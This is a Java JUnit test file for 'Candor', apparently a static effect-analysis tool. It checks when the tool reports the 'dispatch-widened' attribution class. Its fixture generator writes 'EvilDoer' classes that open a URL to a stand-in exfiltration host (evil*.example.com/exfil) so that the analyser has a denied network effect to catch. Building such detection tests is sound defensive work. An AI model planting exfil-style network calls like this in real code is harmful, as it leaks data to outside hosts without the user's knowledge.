package io.poly.candor;

import static io.poly.candor.TestCompiler.compile;
import static io.poly.candor.TestCompiler.rm;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

/**
 * THE {@code dispatch-widened} FALLBACK, EXERCISED LOCALLY — closing a gap the ⟨0.34⟩ release panel found:
 * {@code dispatch-widened} is written six times in {@link Candor} ({@link Candor#applyDispatchWidening}'s
 * ambiguous-attribution branch) and, before this file, appeared in zero tests anywhere in this repo.
 * candor-spec's conformance PART 85 ({@code peek_scope_check.py}) pins the SHARED property — a scope
 * widens to reach an in-scope dispatcher, attribution names the excluded declaration, and the fallback
 * must NOT fire when attribution is unambiguous — but its own docstring says it <b>deliberately does not
 * assert a genuine {@code dispatch-widened}-FIRING case for java</b>: only ts's regression suite proves the
 * class is reachable in practice (an unresolvable {@code paths}-mapped interface reference), and PART 85
 * treats a java/swift firing fixture as "an implementation detail of ONE mechanism", not the four-way
 * property.
 *
 * <p>So this file measures, LOCALLY, what java itself does: whether the class the engine ships can
 * actually be produced by this engine's own mechanism, under what shape, and that it never leaks into
 * {@code excluded[].class} (SPEC: {@code dispatch-widened} is a value of {@code outOfScope[].class} only).
 *
 * <p><b>THE MECHANISM THAT FIRES IT.</b> {@link Candor#applyDispatchWidening} names the excluded
 * declaration directly when exactly ONE peeked/excluded declaration explains a judged caller's new effect
 * ({@code candidates.size() == 1}); it falls back to {@code dispatch-widened} against the CALLER instead
 * when that is not true — either no single candidate explains it, or (measured here) MORE THAN ONE
 * excluded declaration reachable via the same dispatch site independently carries the denied effect, so
 * attribution is genuinely ambiguous. Two excluded conformers of one interface, both denied-effectful,
 * both reached from the same in-scope call site, is sufficient and is what {@link
 * #dispatchWidenedFiresWhenTwoExcludedConformersAreEquallyResponsible} builds.
 */
class DispatchWidenedFiringTest {

    @TempDir Path tmp;

    private record Run(int exit, String stdout, String stderr) {}

    private static Run runCli(String... args) throws Exception {
        String javaBin = System.getProperty("java.home") + "/bin/java";
        String cp = System.getProperty("java.class.path");
        List<String> cmd = new ArrayList<>(List.of(javaBin, "-cp", cp, "io.poly.candor.Candor"));
        cmd.addAll(List.of(args));
        Process p = new ProcessBuilder(cmd).start();
        String out = drain(p.getInputStream()), err = drain(p.getErrorStream());
        return new Run(p.waitFor(), out, err);
    }

    private static String drain(InputStream in) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        in.transferTo(bos);
        return bos.toString();
    }

    private Path policy(String name, String text) throws Exception {
        Path p = tmp.resolve(name);
        Files.writeString(p, text);
        return p;
    }

    private JsonObject json(Path f) throws Exception {
        return JsonParser.parseString(Files.readString(f)).getAsJsonObject();
    }

    /**
     * The in-scope, COMPILED half of every fixture below: an interface, a pure in-scope implementer (so
     * the primary scan's own CHA sees at least one clean conformer), and a dispatcher that calls through
     * the interface type — never the concrete type — so CHA, not a direct call, is what has to widen.
     */
    private Path inScopeTree(String dirName) throws Exception {
        Path classes = compile(Map.of(
            "com/x/Doer.java", "package com.x;\npublic interface Doer { void work(); }",
            "com/x/PureDoer.java",
            "package com.x;\npublic class PureDoer implements Doer { public void work(){} }",
            "com/x/RunnerCaller.java",
            "package com.x;\npublic class RunnerCaller { public static void invoke(Doer d){ d.work(); } }"));
        Path root = tmp.resolve(dirName);
        Files.createDirectories(root.resolve("com/x"));
        for (String cls : List.of("Doer", "PureDoer", "RunnerCaller")) {
            Files.copy(classes.resolve("com/x/" + cls + ".class"), root.resolve("com/x/" + cls + ".class"));
        }
        rm(classes.getParent());
        return root;
    }

    private void writeExcludedConformer(Path root, String className, String host) throws Exception {
        Files.writeString(root.resolve("com/x/" + className + ".java"), String.join("\n",
            "package com.x;",
            "public class " + className + " implements Doer {",
            "  public void work(){",
            "    try { new java.net.URL(\"http://" + host + ".example.com/exfil\")",
            "        .openConnection().getInputStream(); } catch (Exception e) {}",
            "  }",
            "}"));
    }

    private JsonArray outOfScope(JsonObject rpt) {
        return rpt.has("outOfScope") ? rpt.getAsJsonArray("outOfScope") : new JsonArray();
    }

    // ── THE FIRING CASE ───────────────────────────────────────────────────────────────────────────────

    /**
     * THE FINDING: {@code dispatch-widened} DOES fire, and here is the shape that fires it. TWO excluded
     * (uncompiled — SPEC ⟨0.29⟩ {@code source-without-class}) conformers of the same interface, both
     * denied-effectful, both reached only through {@code RunnerCaller.invoke}'s interface-typed dispatch —
     * so the union CHA resolves the call site to both, and neither can be preferred over the other.
     *
     * <p>MEASURED against the current engine (before this test existed): `deny Net Runner` -> exit 2,
     * `outOfScope` carries exactly one `Net` entry, `fn: "com.x.RunnerCaller.invoke"`,
     * `class: "dispatch-widened"`. If this ever goes back to exit 0 or an empty `outOfScope`, the engine
     * has stopped being able to produce the vocabulary it ships in {@link Candor}'s six references to the
     * literal string.
     */
    @Test void dispatchWidenedFiresWhenTwoExcludedConformersAreEquallyResponsible() throws Exception {
        Path root = inScopeTree("ambiguous");
        writeExcludedConformer(root, "EvilDoerA", "evila");
        writeExcludedConformer(root, "EvilDoerB", "evilb");

        Path out = tmp.resolve("scoped.json");
        Run r = runCli(root.toString(), "--json", out.toString(),
                       "--policy", policy("scoped.pol", "deny Net Runner\n").toString());
        assertEquals(2, r.exit(), "a rule scoped to the in-scope dispatcher must catch the effect reached "
                + "through it via CHA into TWO ambiguous excluded conformers: " + r.stdout() + r.stderr());

        JsonObject rpt = json(out);
        JsonArray oos = outOfScope(rpt);
        List<JsonObject> netHits = new ArrayList<>();
        for (var e : oos) {
            JsonObject o = e.getAsJsonObject();
            if (o.has("effects") && o.getAsJsonArray("effects").toString().contains("Net")) netHits.add(o);
        }
        assertEquals(1, netHits.size(), "exactly one Net finding at the caller, not one per ambiguous "
                + "candidate — attribution collapses to the CALLER once it cannot pick between them: " + oos);
        JsonObject hit = netHits.get(0);
        assertEquals("com.x.RunnerCaller.invoke", hit.get("fn").getAsString(), hit.toString());
        assertEquals("dispatch-widened", hit.get("class").getAsString(),
            "attribution is genuinely ambiguous here (two excluded conformers, either could explain the "
            + "new effect) — this IS the case the fallback exists for: " + hit);

        // …and it must never leak into `excluded[].class` — SPEC: dispatch-widened is a value of
        // outOfScope[].class only, describing an in-scope CALLER, never a value of excluded[].class,
        // which describes a class the scan chose not to open.
        if (rpt.has("excluded")) {
            for (var e : rpt.getAsJsonArray("excluded")) {
                JsonObject o = e.getAsJsonObject();
                String cls = o.has("class") && !o.get("class").isJsonNull() ? o.get("class").getAsString() : "";
                assertFalse("dispatch-widened".equals(cls),
                    "`dispatch-widened` must never appear as an `excluded[].class` value: " + o);
            }
        }
    }

    // ── THE OVER-CHARGE CONTROL ───────────────────────────────────────────────────────────────────────

    /**
     * THE CONTROL for the row above: with only ONE excluded conformer reachable, attribution is
     * unambiguous and the engine MUST name the excluded declaration directly (`EvilDoer.work`), never fall
     * back to `dispatch-widened` — PART 85's own over-charge assertion, reproduced locally so a local
     * revert of the fix is caught without needing candor-spec's harness.
     */
    @Test void dispatchWidenedDoesNotFireWhenExactlyOneCandidateExplainsIt() throws Exception {
        Path root = inScopeTree("unambiguous");
        writeExcludedConformer(root, "EvilDoer", "evil");

        Path out = tmp.resolve("scoped.json");
        Run r = runCli(root.toString(), "--json", out.toString(),
                       "--policy", policy("scoped.pol", "deny Net Runner\n").toString());
        assertEquals(2, r.exit(), r.stdout() + r.stderr());

        JsonArray oos = outOfScope(json(out));
        List<JsonObject> netHits = new ArrayList<>();
        for (var e : oos) {
            JsonObject o = e.getAsJsonObject();
            if (o.has("effects") && o.getAsJsonArray("effects").toString().contains("Net")) netHits.add(o);
        }
        assertEquals(1, netHits.size(), oos.toString());
        JsonObject hit = netHits.get(0);
        assertEquals("com.x.EvilDoer.work", hit.get("fn").getAsString(),
            "exactly one excluded conformer explains the new effect — the engine must name it directly, "
            + "not disclose an ambiguity that was never there: " + hit);
        assertFalse("dispatch-widened".equals(hit.has("class") ? hit.get("class").getAsString() : ""),
            "an unambiguous case falling back to `dispatch-widened` is the OVER-CHARGE direction SPEC "
            + "⟨0.34⟩ forbids — it degrades the class into the blanket \"everything is Unknown\" hedge: "
            + hit);
    }

    /**
     * A SECOND OVER-CHARGE CONTROL, same tree as the firing case: a scope matching neither the excluded
     * declarations nor any function that reaches them must stay silent — proving the widened scope test
     * does not degrade into "any exclusion, any scope" once TWO candidates are in play.
     */
    @Test void aNonMatchingScopeStaysSilentEvenWithTwoAmbiguousCandidates() throws Exception {
        Path root = inScopeTree("nomatch");
        writeExcludedConformer(root, "EvilDoerA", "evila");
        writeExcludedConformer(root, "EvilDoerB", "evilb");

        Path out = tmp.resolve("nomatch.json");
        Run r = runCli(root.toString(), "--json", out.toString(),
                       "--policy", policy("nomatch.pol", "deny Net NoSuchCaller\n").toString());
        assertEquals(0, r.exit(), r.stdout() + r.stderr());
        JsonArray oos = outOfScope(json(out));
        assertTrue(oos.isEmpty(), "a scope matching nothing reachable must report nothing: " + oos);
    }
}
